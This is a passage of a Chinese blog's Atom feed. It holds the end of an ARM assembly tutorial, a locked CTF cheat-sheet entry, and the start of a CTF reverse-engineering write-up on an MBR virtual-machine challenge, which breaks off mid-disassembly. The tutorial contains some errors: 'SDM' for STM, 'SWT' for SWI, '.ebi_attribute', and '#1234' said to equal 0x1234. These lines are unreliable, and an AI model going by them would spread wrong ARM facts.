处理器正常的程序执行状态。</li><li>快速中断模式：用于高速数据传输或通道处理。</li><li>外部中断模式：用于通用的中断处理。</li><li>管理模式：操作系统使用的保护模式。</li><li>数据访问终止模式：当数据或指令预取终止时进如该模式，可用于模拟存储及存储保护。</li><li>系统模式：运行具有特权的操作系统任务。</li><li>未定义指令中止模式：当未定义的指令执行时进入该模式。</li></ol></li></ol><blockquote><p>ARM 汇编难以分析的原因：IDA 自身的缺陷；函数库与类有时无法识别；自身对 ARM 汇编的熟练度。</p></blockquote><h2 id="函数参数传递"><a href="#函数参数传递" class="headerlink" title="函数参数传递"></a>函数参数传递</h2><p>遵循 ATPCS 规则，前 4 个参数使用 R0~R3 传递，剩余参数通过堆栈传递。</p><h2 id="ARM-和-Thumb"><a href="#ARM-和-Thumb" class="headerlink" title="ARM 和 Thumb"></a>ARM 和 Thumb</h2><p>Thumb 是 16 位的 ARM 汇编。一般地，ARM 每行代码占 4 个字节码，Thumb 每个指令占 2 个字节。两者不能混用，但可以通过 BX、BLX 等指令在跳转的时候实现切换。在动态调试的时候，IDA 对 ARM 和 Thumb 的分析会混淆，可以用 Alt+G 来修改相应的识别。</p><h2 id="ARM-寄存器"><a href="#ARM-寄存器" class="headerlink" title="ARM 寄存器"></a>ARM 寄存器</h2><ul><li>R0-R7：通用寄存器</li><li>R8-R10：不常用的通用寄存器</li><li>R11：基质寄存器（FP）</li><li>R12：暂时寄存器（IP）</li><li>R13：堆栈制作（SP）</li><li>R14：链接寄存器（LR）</li><li>CPSR：状态寄存器</li></ul><h2 id="ARM-指令"><a href="#ARM-指令" class="headerlink" title="ARM 指令"></a>ARM 指令</h2><h3 id="寄存器交互指令"><a href="#寄存器交互指令" class="headerlink" title="寄存器交互指令"></a>寄存器交互指令</h3><ul><li>LDR：从存储器中加载数据到寄存器。<ul><li><code>LDR R1, [R2]</code>：把 R2 指向的位置的数据给 R1</li></ul></li><li>STR：把寄存器的数据存储到存储器<ul><li><code>STR R1, [R2]</code>：在 R2 指向的地址，存储 R1</li></ul></li><li>LDM：将存储器的数据加载到一个寄存器列表。<ul><li><code>LDM R0, {R1, R2, R3}</code>：把 R0 中的数据一次加载到 R1、R2、R3</li></ul></li><li>SDM：将一个寄存器列表的数据存储到指定的存储器<ul><li><code>SDM R0, {R1, R2, R3}</code>：把 R1、R2、R3 加载到 R0 单元</li></ul></li><li>PUSH：入栈</li><li>POP：出栈</li></ul><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><ul><li>MOV：将立即数或寄存器的数据传送到目标寄存器</li></ul><h3 id="数据算数运算指令"><a href="#数据算数运算指令" class="headerlink" title="数据算数运算指令"></a>数据算数运算指令</h3><h4 id="ADD（加法）"><a href="#ADD（加法）" class="headerlink" title="ADD（加法）"></a>ADD（加法）</h4><p>ADD 将把两个操作数加起来，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD </span><span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="built_in">R2</span> <span class="comment">@ R0 = R1 + R2</span></span><br><span class="line"><span class="keyword">ADD </span><span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="number">#256</span> <span class="comment">@ R0 = R1 + 256</span></span><br><span class="line"><span class="keyword">ADD </span><span class="built_in">R0</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span>, <span class="keyword">LSL#1 </span><span class="comment">@ R0 = R2 + (R3 &lt;&lt; 1)</span></span><br></pre></td></tr></table></figure><p>加法可以在有符号和无符号数上进行。</p><ul><li>ADC：带进位的加法</li></ul><h4 id="SUB（减法）"><a href="#SUB（减法）" class="headerlink" title="SUB（减法）"></a>SUB（减法）</h4><p>SUB 用操作数 1 减去操作数 2，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SUB </span><span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="built_in">R2</span> <span class="comment">@ R0 = R1 - R2</span></span><br><span class="line"><span class="keyword">SUB </span><span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="number">#256</span> <span class="comment">@ R0 = R1 - 256</span></span><br><span class="line"><span class="keyword">SUB </span><span class="built_in">R0</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span>, <span class="keyword">LSL#1 </span><span class="comment">@ R0 = R2 - (R3 &lt;&lt; 1)</span></span><br></pre></td></tr></table></figure><p>减法可以在有符号和无符号数上进行。</p><ul><li>SBC：带进位的减法</li></ul><h4 id="MUL（乘法）和-DIV（除法）"><a href="#MUL（乘法）和-DIV（除法）" class="headerlink" title="MUL（乘法）和 DIV（除法）"></a>MUL（乘法）和 DIV（除法）</h4><ul><li>给出的所有操作数、和目的寄存器必须为简单的寄存器。</li><li>不能对操作数 2 使用立即值或被移位的寄存器。</li><li>目的寄存器和操作数 1 必须是不同的寄存器。</li><li>不能指定 R15 为目的寄存器</li></ul><p>MUL 提供 32 位整数乘法。如果操作数是有符号的，可以假定结果也是有符号的。</p><ul><li>MLA：带累加的乘法</li></ul><p>除法指令 DIV 的条件与乘法类似。</p><ul><li>SDIV：带符号除法</li><li>UDIV：不带符号位除法</li></ul><h3 id="数据逻辑运算指令"><a href="#数据逻辑运算指令" class="headerlink" title="数据逻辑运算指令"></a>数据逻辑运算指令</h3><ul><li>AND：与</li><li>ORR：或</li><li>EOR：异或</li><li>LSL：逻辑左移</li><li>LSR：逻辑右移</li></ul><h3 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h3><ul><li>CMP：比较指令</li></ul><h3 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h3><ul><li>SWT：切换用户模式</li><li>DCB：伪指令</li></ul><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><ul><li>B：无条件跳转</li><li>BL：带链接的无条件跳转</li><li>BLX：带状态的无条件跳转</li><li>BNE：不相等跳转</li><li>BEQ：相等跳转</li></ul><h4 id="偏移地址计算"><a href="#偏移地址计算" class="headerlink" title="偏移地址计算"></a>偏移地址计算</h4><ul><li>ARM：低 27 位是偏移位置<ul><li>偏移 = (目标地址 - 当前 PC 地址) / 指令长度</li><li>正数下跳，负数上跳</li></ul></li><li>Thumb 同理</li><li>目标地址 = 偏移 * 指令长度 + 当前偏移地址</li></ul><h2 id="ARM-代码编写"><a href="#ARM-代码编写" class="headerlink" title="ARM 代码编写"></a>ARM 代码编写</h2><p>处理器架构定义：</p><ul><li><code>.arch</code> 指定了 ARM 处理器架构。</li><li><code>armv5te</code> 表示本程序在 armv5te 架构处理器上运行。</li><li><code>.fpu</code> 指定了协处理器的类型。</li><li><code>softvfp</code> 表示使用浮点运算库来模拟协处理运算。</li><li><code>.ebi_attribute</code> 指定了一些接口属性。</li></ul><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.arch</span> armv5te <span class="comment">@处理器架构</span></span><br><span class="line"><span class="symbol">.fpu</span> softvfp  <span class="comment">@协处理器类型</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">20</span>, <span class="number">1</span> <span class="comment">@接口属性</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">21</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">23</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">24</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">25</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">26</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">30</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">18</span>, <span class="number">1</span></span><br></pre></td></tr></table></figure><p>段定义：</p><ul><li><code>.section</code>：定义只读数据，属性是默认</li><li><code>.text</code>：定义了代码段。</li></ul><p>注释方法：</p><ul><li><code>/.../</code>：多行注释</li><li><code>@</code>：单行注释</li></ul><p>标号方式（和 8086 类似）：</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">loop</span>:</span><br><span class="line">    ...</span><br><span class="line"><span class="symbol">end</span> loop</span><br></pre></td></tr></table></figure><p>程序中所有以“.”开头的指令都是汇编指令，他们不属于 ARM 指令集：</p><ul><li>.file：制定了源文件名。</li><li>.align：代码对其方式。</li><li>.ascii：声明字符串。</li><li>.global：声明全局变量。</li><li>.type：指定符号的类型。</li></ul><p>声明函数的方法：</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.global</span> 函数名</span><br><span class="line"><span class="symbol">.type</span> 函数名, %<span class="meta">function</span></span><br><span class="line">函数名:</span><br><span class="line">    &lt;...函数体...&gt;</span><br><span class="line">声明一个实现两个数相加的函数的代码</span><br><span class="line"><span class="symbol">.global</span> MyAdd</span><br><span class="line"><span class="symbol">.type</span> MyAdd, &amp;<span class="meta">function</span></span><br><span class="line"><span class="symbol">MyAdd</span>:</span><br><span class="line">    <span class="keyword">ADD </span><span class="built_in">R0</span>, <span class="built_in">R0</span>, <span class="built_in">R1</span></span><br><span class="line">    <span class="keyword">MOV </span><span class="built_in">PC</span>, <span class="built_in">LR</span></span><br></pre></td></tr></table></figure><h2 id="ARM-处理器寻址方式"><a href="#ARM-处理器寻址方式" class="headerlink" title="ARM 处理器寻址方式"></a>ARM 处理器寻址方式</h2><h3 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">@ 井号（#）作为前缀，表示16进制时以“0x”开头</span></span><br><span class="line"><span class="keyword">MOV </span><span class="built_in">R0</span>，<span class="number">#1234</span> <span class="comment">@ R0=0x1234</span></span><br></pre></td></tr></table></figure><h3 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV </span><span class="built_in">R0</span>, <span class="built_in">R1</span> <span class="comment">@ R0=R1</span></span><br></pre></td></tr></table></figure><h3 id="寄存器移位寻址"><a href="#寄存器移位寻址" class="headerlink" title="寄存器移位寻址"></a>寄存器移位寻址</h3><p>五种移位操作：</p><ul><li>LSL：逻辑左移，移位后寄存器空出的低位补 0；</li><li>LSR：逻辑右移，移位后寄存器空出的高位补 0；</li><li>ASR：算数右移，移动过程中符号位不变。如果操作数是整数，则移位后空出的高位补 0，否则补 1；</li><li>ROR：循环右移，移位后移出的低位填入移位空出的高位；</li><li>RRX：带扩展的循环右移，操作数右移移位，移位空出的高位用 C 标志的值填充。</li></ul><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV </span><span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="keyword">LSL#2 </span><span class="comment">@ R0=R1*4</span></span><br></pre></td></tr></table></figure><h3 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>，[<span class="built_in">R1</span>] <span class="comment">@ 将R1寄存器中的值作为地址，取出地址中的值赋予R0</span></span><br></pre></td></tr></table></figure><h3 id="寄存器间接基址偏移寻址"><a href="#寄存器间接基址偏移寻址" class="headerlink" title="寄存器间接基址偏移寻址"></a>寄存器间接基址偏移寻址</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>, [<span class="built_in">R1</span>, #-<span class="number">4</span>] <span class="comment">@ 将R1寄存器的值-0x4的值作为地址，取出地址中的值给R0</span></span><br></pre></td></tr></table></figure><h3 id="多寄存器寻址"><a href="#多寄存器寻址" class="headerlink" title="多寄存器寻址"></a>多寄存器寻址</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">@ LDM 是数据加载命令，指令的后缀IA表示每次执行完成加载操作后R0寄存器的值自增1</span></span><br><span class="line"><span class="keyword">LDMIA </span><span class="built_in">R0</span>, &#123;<span class="built_in">R1</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span>, <span class="built_in">R4</span>&#125;</span><br><span class="line"><span class="comment">@ R1=[R0]</span></span><br><span class="line"><span class="comment">@ R2=[R0+#4]</span></span><br><span class="line"><span class="comment">@ R3=[R0+#8]</span></span><br><span class="line"><span class="comment">@ R4=[R0+#12]</span></span><br><span class="line"><span class="comment">@ ARM中，字表示的是一个32位。这里+#4的原因是因为32位占4个字节</span></span><br></pre></td></tr></table></figure><h3 id="堆栈寻址"><a href="#堆栈寻址" class="headerlink" title="堆栈寻址"></a>堆栈寻址</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">STMFD </span><span class="built_in">SP</span>!, &#123;<span class="built_in">R1</span>-<span class="built_in">R7</span>, <span class="built_in">LR</span>&#125; <span class="comment">@ 入栈，多用于保存子程序堆栈</span></span><br><span class="line"><span class="keyword">LDMFD </span><span class="built_in">SP</span>!, &#123;<span class="built_in">R1</span>-<span class="built_in">R7</span>, <span class="built_in">LR</span>&#125; <span class="comment">@ 出栈，多用于恢复子程序堆栈</span></span><br></pre></td></tr></table></figure><h3 id="块拷贝寻址"><a href="#块拷贝寻址" class="headerlink" title="块拷贝寻址"></a>块拷贝寻址</h3><p>块拷贝可实现连续地址数据从存储器的某一位置拷贝到另一位置。</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDMIA </span><span class="built_in">R0</span>!, &#123;<span class="built_in">R1</span>-<span class="built_in">R3</span>&#125; <span class="comment">@ 从寄存器指向的存储单元中读取3个字到R1-R3寄存器。</span></span><br></pre></td></tr></table></figure><h3 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h3><p>相对寻址一程序计数器 PC 的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到的操作数的有效地址。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://blog.csdn.net/miao_007/article/details/87632758" target="_blank" rel="noopener">https://blog.csdn.net/miao_007/article/details/87632758</a><br><a href="https://stackoverflow.com/questions/4629308/any-simple-way-to-log-in-android-ndk-code" target="_blank" rel="noopener">https://stackoverflow.com/questions/4629308/any-simple-way-to-log-in-android-ndk-code</a><br><a href="https://www.jianshu.com/p/acbf724fdcc9" target="_blank" rel="noopener">https://www.jianshu.com/p/acbf724fdcc9</a><br><a href="https://blog.csdn.net/afei__/article/details/81031965" target="_blank" rel="noopener">https://blog.csdn.net/afei__/article/details/81031965</a><br><a href="https://www.luoxudong.com/360.html" target="_blank" rel="noopener">https://www.luoxudong.com/360.html</a><br><a href="https://www.jianshu.com/p/23af9151837e" target="_blank" rel="noopener">https://www.jianshu.com/p/23af9151837e</a><br><a href="https://juejin.im/post/5afe28446fb9a07aa0483d0a" target="_blank" rel="noopener">https://juejin.im/post/5afe28446fb9a07aa0483d0a</a><br><a href="https://www.52pojie.cn/thread-699268-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-699268-1-1.html</a><br><a href="https://www.52pojie.cn/thread-673175-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-673175-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Android JNI 编程及 ARM 汇编入门。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
      <category term="android" scheme="https://qianfei11.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>【TOP】CTF CheatSheet by AssassinQ</title>
    <link href="https://qianfei11.github.io/2020/01/25/CTF-CheatSheet-by-AssassinQ/"/>
    <id>https://qianfei11.github.io/2020/01/25/CTF-CheatSheet-by-AssassinQ/</id>
    <published>2020-01-24T16:00:00.000Z</published>
    <updated>2020-02-06T12:00:14.230Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Enter Password and Continue Reading...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="15072864a9906f807a96727988d66a8448695d02df95c06f42184a6e0a54f36a"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Continue Reading...
    
    </summary>
    
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019-CISCN-strange_int</title>
    <link href="https://qianfei11.github.io/2020/01/24/2019-CISCN-strange-int/"/>
    <id>https://qianfei11.github.io/2020/01/24/2019-CISCN-strange-int/</id>
    <published>2020-01-24T08:46:38.000Z</published>
    <updated>2020-01-27T03:42:36.631Z</updated>
    
    <content type="html"><![CDATA[<p>一道 MBR 虚拟机的题目，同时也熟悉了使用 bochs 对 MBR 的调试。</p><a id="more"></a><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file Image.bin</span><br><span class="line">Image.bin: DOS/MBR boot sector</span><br></pre></td></tr></table></figure><p>先在 IDA 中 16 位的模式打开。在 7C00~7C0E 的代码（MBR 的加载地址是 0x7C00 处）是对寄存器和栈指针进行初始化操作；在 7C0F~7C12 的代码是 x86 系统中的第 17 号调用，设置了显示模式；在 7C14~7C24 的代码是 x86 系统中的第 20 号调用，从软盘的第 0 个磁盘第 0 个柱面第 2 个扇区开始的共 28 个扇区读取数据到内存的 10000000 处；在 7C2B~7C3B 的代码将内存中 10000000~10002000 的数据赋值给内存 0~2000 处；在 7C3D~7C47 的代码初始化 IDT 和 GDT；在 7C4C~7C52 的代码处，启动保护模式，并跳转至 32 位代码段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">MBR16:0000 sub_0           proc near</span><br><span class="line">MBR16:0000                 jmp     far ptr 7C0h:5</span><br><span class="line">MBR16:0000 sub_0           endp</span><br><span class="line">MBR16:0000</span><br><span class="line">MBR16:0005</span><br><span class="line">MBR16:0005 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">MBR16:0005</span><br><span class="line">MBR16:0005</span><br><span class="line">MBR16:0005 sub_5           proc near</span><br><span class="line">MBR16:0005                 mov     ax, cs</span><br><span class="line">MBR16:0007                 mov     ds, ax</span><br><span class="line">MBR16:0009                 assume ds:MBR16</span><br><span class="line">MBR16:0009                 mov     ss, ax</span><br><span class="line">MBR16:000B                 assume ss:MBR16</span><br><span class="line">MBR16:000B                 mov     sp, 400h</span><br><span class="line">MBR16:000E                 cld</span><br><span class="line">MBR16:000F                 mov     ax, 3</span><br><span class="line">MBR16:0012                 int     10h             ; - VIDEO - SET VIDEO MODE</span><br><span class="line">MBR16:0012                                         ; AL = mode</span><br><span class="line">MBR16:0014                 mov     dx, 0</span><br><span class="line">MBR16:0017                 mov     cx, 2</span><br><span class="line">MBR16:001A                 mov     ax, 1000h</span><br><span class="line">MBR16:001D                 mov     es, ax</span><br><span class="line">MBR16:001F                 assume es:nothing</span><br><span class="line">MBR16:001F                 xor     bx, bx</span><br><span class="line">MBR16:0021                 mov     ax, 228h</span><br><span class="line">MBR16:0024                 int     13h             ; DISK - READ SECTORS INTO MEMORY</span><br><span class="line">MBR16:0024                                         ; AL = number of sectors to read, CH = track, CL = sector</span><br><span class="line">MBR16:0024                                         ; DH = head, DL = drive, ES:BX -&gt; buffer to fill</span><br><span class="line">MBR16:0024                                         ; Return: CF set on error, AH = status, AL = number of sectors read</span><br><span class="line">MBR16:0026                 jnb     short loc_2A</span><br><span class="line">MBR16:0028</span><br><span class="line">MBR16:0028 loc_28:                                 ; CODE XREF: sub_5:loc_28↓j</span><br><span class="line">MBR16:0028                 jmp     short loc_28</span><br><span class="line">MBR16:002A ; ---------------------------------------------------------------------------</span><br><span class="line">MBR16:002A</span><br><span class="line">MBR16:002A loc_2A:                                 ; CODE XREF: sub_5+21↑j</span><br><span class="line">MBR16:002A                 cli</span><br><span class="line">MBR16:002B                 mov     ax, 1000h</span><br><span class="line">MBR16:002E                 mov     ds, ax</span><br><span class="line">MBR16:0030                 assume ds:nothing</span><br><span class="line">MBR16:0030                 xor     ax, ax</span><br><span class="line">MBR16:0032                 mov     es, ax</span><br><span class="line">MBR16:0034                 assume es:MBR16</span><br><span class="line">MBR16:0034                 mov     cx, 2000h</span><br><span class="line">MBR16:0037                 sub     si, si</span><br><span class="line">MBR16:0039                 sub     di, di</span><br><span class="line">MBR16:003B                 rep movsb</span><br><span class="line">MBR16:003D                 mov     ax, 7C0h</span><br><span class="line">MBR16:0040</span><br><span class="line">MBR16:0040 loc_40:                                 ; DATA XREF: sub_5+D↑r</span><br><span class="line">MBR16:0040                 mov     ds, ax</span><br><span class="line">MBR16:0042                 assume ds:nothing</span><br><span class="line">MBR16:0042                 lidt    fword ptr ds:6Fh ; Init IDT</span><br><span class="line">MBR16:0047                 lgdt    fword ptr ds:75h ; Init GDT</span><br><span class="line">MBR16:004C</span><br><span class="line">MBR16:004C loc_4C:                                 ; DATA XREF: sub_5+1F↑r</span><br><span class="line">MBR16:004C                 mov     ax, 1            ; Start Protected Mode</span><br><span class="line">MBR16:004F                 lmsw    ax               ; Jump to 32-bit Code</span><br><span class="line">MBR16:004F sub_5           endp</span><br><span class="line">MBR16:004F</span><br><span class="line">MBR16:004F MBR16           ends</span><br></pre></td></tr></table></figure><blockquote><h2 id="何为-IDT-和-GDT？"><a href="#何为-IDT-和-GDT？" class="headerlink" title="何为 IDT 和 GDT？"></a>何为 IDT 和 GDT？</h2><h3 id="GDT"><a href="#GDT" class="headerlink" title="GDT"></a>GDT</h3><p>全局描述表（Global Descriptor Table）。在实时模式下，对一个内存地址的访问是通过段寄存器的方式来进行（一个段具备两个元素：[Base Address, Limit]），即段模式。而在保护模式下（保护模式运行在 32 位系统上），内存的管理模式分为两种，段模式和页模式，其中页模式也是基于段模式的（纯段模式和段页模式）。</p><p>在保护模式下，对一个段的描述则包括 3 方面因素：[Base Address, Limit, Access]，它们加在一起被放在一个 64-bit 长的数据结构中，被称为段描述符。而段寄存器仍然是 16-bit，无法通过 16-bit 长度的段寄存器来直接引用 64-bit 的段描述符。</p><p>解决方法就是把这些长度为 64-bit 的段描述符放入一个数组即 GDT 中。当程序员通过段寄存器来引用一个段描述符时，CPU 必须知道 GDT 的入口，也就是基地址放在哪里，所以 Intel 的设计者门提供了一个寄存器 GDTR 用来存放 GDT 的入口地址，程序员将 GDT 设定在内存中某个位置之后，可以通过 LGDT 指令将 GDT 的入口地址装入此寄存器，从此以后，CPU 就根据此寄存器中的内容作为 GDT 的入口来访问 GDT 了。</p><h3 id="IDT"><a href="#IDT" class="headerlink" title="IDT"></a>IDT</h3><p>中断描述符表（Interrupt Descriptor Table），和 GDT 类似，记录了 0~255 的中断号和调用函数之间的关系。</p><p>段描述符使用数组存储，使用 LIDT 指令将 IDT 的入口地址装入 IDTR 寄存器。</p></blockquote><p>接下来在 IDA 中用 32 位模式打开。一开始的一段代码对 IDT 和 GDT 进行了初始化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">seg001:00000205 sub_205         proc near</span><br><span class="line">seg001:00000205                 mov     ds, eax</span><br><span class="line">seg001:00000207                 lss     esp, fword ptr ds:dword_B34+28h</span><br><span class="line">seg001:0000020E                 call    IDT_Init</span><br><span class="line">seg001:00000213                 call    GDT_Init</span><br><span class="line">seg001:00000218                 mov     eax, 10h        ; DATA XREF: sub_28B+27↓r</span><br><span class="line">seg001:0000021D                 mov     ds, eax</span><br><span class="line">seg001:0000021F                 assume ds:nothing</span><br><span class="line">seg001:0000021F                 mov     es, eax</span><br><span class="line">seg001:00000221                 assume es:nothing</span><br><span class="line">seg001:00000221                 mov     fs, eax         ; DATA XREF: sub_283↓r</span><br><span class="line">seg001:00000223                 assume fs:nothing</span><br><span class="line">seg001:00000223                 mov     gs, eax</span><br><span class="line">seg001:00000225                 assume gs:nothing</span><br><span class="line">seg001:00000225                 lss     esp, large ds:0B5Ch</span><br><span class="line">seg001:00000225                                         ; DATA XREF: sub_28B+11↓o</span><br><span class="line">seg001:0000022C                 xor     ebx, ebx</span><br></pre></td></tr></table></figure><p>IDT_init 处，先将 000800FC 赋给了 EAX，将 8E00 赋给了 DX。然后进行了一个 256 次的循环，每次循环从 00080128 的地址开始，分别存入 EAX 和 EDX。最后加载 IDTR，地址为 11C。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">seg001:0000028B IDT_Init        proc near               ; CODE XREF: sub_205+9↑p</span><br><span class="line">seg001:0000028B                 mov     edx, 0FCh</span><br><span class="line">seg001:00000290                 mov     eax, 80000h</span><br><span class="line">seg001:00000295                 mov     ax, dx</span><br><span class="line">seg001:00000298                 mov     dx, 8E00h</span><br><span class="line">seg001:0000029C                 lea     edi, ds:128h</span><br><span class="line">seg001:000002A2                 mov     ecx, 100h</span><br><span class="line">seg001:000002A7</span><br><span class="line">seg001:000002A7 loc_2A7:                                ; CODE XREF: IDT_Init+25↓j</span><br><span class="line">seg001:000002A7                 mov     [edi], eax</span><br><span class="line">seg001:000002A9                 mov     [edi+4], edx</span><br><span class="line">seg001:000002AC                 add     edi, 8</span><br><span class="line">seg001:000002AF                 dec     ecx</span><br><span class="line">seg001:000002B0                 jnz     short loc_2A7</span><br><span class="line">seg001:000002B2                 lidt    large 